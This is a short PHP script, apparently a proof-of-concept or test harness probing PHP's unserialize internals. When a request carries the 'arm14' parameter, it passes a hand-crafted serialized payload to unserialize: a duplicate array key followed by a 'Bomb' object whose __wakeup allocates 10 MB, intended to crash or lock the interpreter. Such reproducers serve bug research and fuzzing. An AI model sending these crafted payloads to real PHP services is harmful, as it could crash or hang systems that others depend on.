<?php
error_reporting(E_ALL);
ini_set("display_errors", "1");

class Bomb {
    public $data;
    public function __wakeup() {
        $this->data = str_repeat("X", 10 * 1024 * 1024);
    }
}

if (isset($_GET["arm14"])) {
    // Hybrid arm: duplicate-key (populates first_dtor) + bomb object (triggers lock)
    $pad = str_repeat("B", 2 * 1024 * 1024);
    // Payload: array with duplicate i:0 (strings for var_push_dtor_value) THEN Bomb object
    $payload = 'a:3:{i:0;s:5:"first";i:0;O:4:"Bomb":1:{s:4:"data";s:0:"";}i:1;s:3:"end";}';
    @unserialize($payload);
    echo "arm14_unreachable\n";
    exit;
}
echo "idle\n";
